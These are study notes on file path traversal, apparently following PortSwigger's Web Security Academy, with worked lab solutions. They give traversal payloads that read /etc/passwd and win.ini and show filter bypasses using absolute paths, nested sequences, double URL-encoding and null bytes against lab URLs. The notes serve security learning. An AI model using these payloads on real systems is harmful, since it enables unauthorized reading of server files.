---
description: https://portswigger.net/web-security/file-path-traversal
---

# File Path Traversal

Consider a shopping application that displays images of items for sale. Images are loaded via some HTML like the following:

```
<img src="/loadImage?filename=218.png">
```

The loadImage URL takes a filename parameter and returns the contents of the specified file. The image files themselves are stored on disk in the location /var/www/images/. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In the above case, the application reads from the following file path:

`/var/www/images/218.png`

The application implements no defenses against directory traversal attacks, so an attacker can request the following URL to retrieve an arbitrary file from the server's filesystem:

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

This causes the application to read from the following file path:

`/var/www/images/../../../etc/passwd`

The sequence ../ is valid within a file path, and means to step up one level in the directory structure. The three consecutive ../ sequences step up from /var/www/images/ to the filesystem root, and so the file that is actually read is:

`/etc/passwd`

```
../ - unix
../ ..\ - win
../../../etc/passwd
......\windows\win.ini
../../../windows/win.ini
```

### **Lab: File path traversal, simple case **

view-source:https://aca01f001f9d8480c09625c5001000ea.web-security-academy.net/image?filename=../../../etc/passwd

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

### **Lab: File path traversal, traversal sequences blocked with absolute path bypass**

If an application strips or blocks directory traversal sequences from the user-supplied filename, then it might be possible to bypass the defense using a variety of techniques.

You might be able to use an absolute path from the filesystem root, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.

view-source:https://aca51f931f78f398c0c25029001c003c.web-security-academy.net/image?filename=/etc/passwd

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

### Lab: File path traversal, traversal sequences stripped non-recursively

You might be able to use nested traversal sequences, such as `....// or ..../`, which will revert to simple traversal sequences when the inner sequence is stripped.

view-source:https://ac841f421fdb6bc2c0d0f6c400e200c9.web-security-academy.net/image?filename=....//....//....//etc//passwd

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

You might be able to use various non-standard encodings, such as `..%c0%af or ..%252f`, to bypass the input filter.&#x20;

..%c0%af - “/” character is encoded in unicode&#x20;

..%252f - “/” character is double encoded

view-source:https://ac141fe81e57ef54c093741800870035.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

### Lab: File path traversal, validation of start of path

If an application requires that the user-supplied filename must start with the expected base folder, such as /var/www/images, then it might be possible to include the required base folder followed by suitable traversal sequences. For example:

`filename=/var/www/images/../../../etc/passwd`

view-source:https://ac981f601ef40b27c0ee254500f300da.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

### Lab: File path traversal, validation of file extension with null byte bypass

If an application requires that the user-supplied filename must end with an expected file extension, such as .png, then it might be possible to use a null byte to effectively terminate the file path before the required extension. For example:

`filename=../../../etc/passwd%00.png`

view-source:https://ac9a1fbf1e8a61a7c04945ad00ad001a.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg
